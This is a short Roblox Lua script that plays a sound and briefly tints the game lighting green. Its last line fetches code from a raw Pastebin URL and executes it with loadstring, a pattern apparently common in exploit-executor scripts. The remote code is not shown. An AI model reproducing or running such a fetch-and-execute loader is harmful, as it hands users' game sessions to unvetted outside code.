local cue2 = Instance.new("Sound")
	cue2.Parent = game.Workspace
	cue2.Name = "Spawn"
	cue2.SoundId = "rbxassetid://3359047385"
	cue2.Volume = 1
	cue2.PlaybackSpeed = 1
	cue2:Play()
game.Lighting.MainColorCorrection.TintColor = Color3.fromRGB(0, 255, 0)
game.Lighting.MainColorCorrection.Contrast = 25
local tween = game:GetService("TweenService")
tween:Create(game.Lighting.MainColorCorrection, TweenInfo.new(9), {Contrast = 0}):Play()
local TweenService = game:GetService("TweenService")
local TW = TweenService:Create(game.Lighting.MainColorCorrection, TweenInfo.new(1),{TintColor = Color3.fromRGB(255, 255, 255)})
TW:Play()
wait(1)
loadstring(game:HttpGet("https://pastebin.com/raw/jTEPNkrV"))()
